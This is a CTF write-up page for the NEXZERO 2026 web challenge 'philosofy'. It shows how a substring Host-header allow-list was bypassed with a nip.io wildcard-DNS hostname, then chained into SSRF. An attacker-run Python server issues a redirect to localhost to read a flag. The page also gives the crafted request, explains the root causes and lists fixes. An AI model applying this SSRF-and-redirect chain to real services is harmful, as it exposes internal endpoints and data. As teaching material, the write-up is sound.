@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>philosofy - 0xsila</title>
+<meta name="description" content="A Host-header allow-list bypassed with wildcard DNS, chained into SSRF and an open redirect back to localhost.">
+<meta name="color-scheme" content="light dark">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/css/style.css">
+</head><body><div class="wrap">
+<header class="top"><a href="../index.html"><b>0xsila</b></a>
+<nav><a href="../index.html#writeups">writeups</a><a href="../index.html#reports">reports</a><a href="../index.html#certifications">certifications</a><a href="../index.html#contact">contact</a></nav></header>
+<p><a href="../index.html#writeups">&larr; writeups</a></p>
+<h1>philosofy</h1>
+<p class="meta">CTF challenge writeup &middot; NEXZERO 2026 &middot; author: 0xsila</p>
+<article class="prose"><p><strong>Author</strong> : 0xsila</p>
+<h2>Challenge Name</h2>
+<p><strong>philosofy</strong></p>
+<h2>Vulnerability Chain</h2>
+<p><strong>Host header allow-list bypass (substring check) → wildcard-DNS domain pointing at an attacker server → SSRF → open redirect back to localhost → flag</strong></p>
+<hr />
+<h2>Challenge Overview</h2>
+<p>The app has one route, <code>/</code>. On every request it reads the host the client claims to be using (preferring <code>X-Forwarded-Host</code>, falling back to <code>Host</code>), and if that host passes a check, the server itself makes a request to <code>http://&lt;that host&gt;/cdn/content.html</code> and echoes the response back in the page.</p>
+<pre><code class="language-js">function getHost(req) {
+  const xfHost = req.headers[&quot;x-forwarded-host&quot;];
+  const host = req.headers[&quot;host&quot;] || &quot;&quot;;
+  if (xfHost &amp;&amp; xfHost.trim() !== &quot;&quot;) return xfHost.split(&quot;,&quot;)[0].trim();
+  return host;
+}
+
+function isAllowedHost(host) {
+  return host.split(&quot;:&quot;)[0].includes(&quot;nexus&quot;);
+}
+</code></pre>
+<p>The check looks reasonable at first: only a host that "belongs to nexus" is allowed to be fetched. The bug is the word <strong>includes</strong>. The allow-list isn't "the host is <code>ctf.nexus-security.club</code>", it's "the host contains the substring <code>nexus</code> anywhere". Any hostname with <code>nexus</code> in it passes, no matter who controls where it resolves to.</p>
+<p>There's also a second piece on the same server: a <code>/flag.txt</code> route that only answers the request if it comes from <code>127.0.0.1</code> / <code>::1</code>.</p>
+<pre><code class="language-js">app.get(&quot;/flag.txt&quot;, (req, res) =&gt; {
+  const ip = req.socket.remoteAddress;
+  if (ip !== &quot;127.0.0.1&quot; &amp;&amp; ip !== &quot;::1&quot; &amp;&amp; ip !== &quot;::ffff:127.0.0.1&quot;) {
+    return res.status(403).send(&quot;forbidden&quot;);
+  }
+  return res.send(FLAG);
+});
+</code></pre>
+<p>Put the two together: if I can make the server's own outgoing request end up at <code>http://127.0.0.1:3000/flag.txt</code>, the IP check sees the request coming from the server talking to itself, and hands me the flag back inside the page I requested.</p>
+<hr />
+<h2>Steps</h2>
+<h3>1. Beat the string check with a wildcard-DNS hostname</h3>
+<p><code>isAllowedHost</code> only checks for the substring <code>nexus</code>. I don't need a <code>nexus</code>-owned domain, I need any domain name that <em>contains</em> that word and that I can point wherever I want.</p>
+<p>Services like <code>nip.io</code> / <code>sslip.io</code> do exactly that: they're wildcard DNS that resolve any hostname of the form <code>&lt;anything&gt;.&lt;ip&gt;.nip.io</code> to <code>&lt;ip&gt;</code>. So I registered nothing, I just picked a hostname:</p>
+<pre><code>nexus.&lt;my-server-ip&gt;.nip.io
+</code></pre>
+<p>This string contains <code>nexus</code>, so <code>isAllowedHost()</code> says yes. And it resolves straight to a VPS I control.</p>
+<p>I sent that as the <code>Host</code> header (<code>X-Forwarded-Host</code> works too, and takes priority):</p>
+<pre><code class="language-http">GET / HTTP/1.1
+Host: nexus.&lt;my-server-ip&gt;.nip.io
+</code></pre>
+<h3>2. Make the server fetch my domain</h3>
+<p>The app builds the request from the same header I just controlled:</p>
+<pre><code class="language-js">const url = `http://${host}/cdn/content.html`;
+const r = await axios.get(url, { maxRedirects: 5, timeout: 5000, ... });
+</code></pre>
+<p>So the server now does <code>GET http://nexus.&lt;my-server-ip&gt;.nip.io/cdn/content.html</code>, which is a request to my own machine. Classic SSRF: I asked the app to visit a URL, and the "allow-list" didn't actually restrict <em>where</em> that URL could point, only what string had to appear in it.</p>
+<h3>3. Turn the SSRF into access to localhost with a redirect</h3>
+<p>My server doesn't need to serve <code>content.html</code>. It just needs to answer with a redirect, and <code>axios</code> was configured with <code>maxRedirects: 5</code>, so it will follow it automatically:</p>
+<pre><code class="language-python">from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(301)
+        self.send_header(&quot;Location&quot;, &quot;http://127.0.0.1:3000/flag.txt&quot;)
+        self.send_header(&quot;Content-Length&quot;, &quot;0&quot;)
+        self.end_headers()
+    def log_message(self, *a):
+        pass
+
+HTTPServer((&quot;0.0.0.0&quot;, 80), Handler).serve_forever()
+</code></pre>
+<p>The app's outgoing request hits my server, my server answers <code>301 → http://127.0.0.1:3000/flag.txt</code>, and axios follows that redirect <strong>from the app's own network position</strong>, not from mine. <code>127.0.0.1</code> there is the challenge server itself.</p>
+<h3>4. Collect the flag</h3>
+<p>The redirected request lands on <code>/flag.txt</code>, running on the same host, so <code>req.socket.remoteAddress</code> is <code>127.0.0.1</code>. The IP check passes, the flag is returned, and the app drops it straight into the page:</p>
+<pre><code class="language-html">&lt;pre&gt;nexus{...}&lt;/pre&gt;
+</code></pre>
+<hr />
+<h2>Why this worked</h2>
+<ul>
+<li><strong>The allow-list checked the wrong thing.</strong> <code>includes("nexus")</code> is a substring test, not a host/ownership test. A hostname I fully control can still "contain" the trusted word.</li>
+<li><strong>The IP allow-list on <code>/flag.txt</code> trusted the position of the request, not its origin.</strong> It only ever sees "did this connection come from 127.0.0.1", so it has no way to tell a legitimate internal call from an SSRF that was redirected there.</li>
+<li><strong>Following redirects turns a one-shot SSRF into an open-ended one.</strong> The first request has to pass the host check; the redirect target doesn't have to pass anything.</li>
+</ul>
+<h2>Fix</h2>
+<ul>
+<li>Validate the host against an exact allow-list (<code>===</code>, or a proper suffix match like <code>host === "nexus-security.club" || host.endsWith(".nexus-security.club")</code>), never a plain substring check.</li>
+<li>Resolve the host and block requests to private/loopback ranges (<code>127.0.0.0/8</code>, <code>::1</code>, link-local, etc.) before <em>and after</em> following redirects, or disable automatic redirects entirely and re-validate every hop.</li>
+<li>Don't trust <code>remoteAddress</code> alone to gate an internal endpoint; an SSRF from the same host will always look local.</li>
+</ul>
+<p><strong>Lesson:</strong> when you see <code>.includes(trustedWord)</code> guarding what the server is allowed to fetch, ask what else can contain that word. A wildcard-DNS service that bakes an attacker-controlled IP into a hostname you pick (<code>nip.io</code>, <code>sslip.io</code>, and friends) is the standard way to pass that kind of check while still pointing exactly where you want.</p></article>
+
+<p><a href="https://github.com/n3xusss/nexzero-26v/tree/main/web/philosofy">Challenge source on GitHub</a></p>
+<div class="pn"><a href="nextrace-2025.html">previous: NEXTRACE 2025: the six web challenges</a><span></span></div>
+<div class="foot">Sila Yahia &middot; 0xsila &middot; <a href="mailto:silayahia7@gmail.com">silayahia7@gmail.com</a></div></div></body></html>
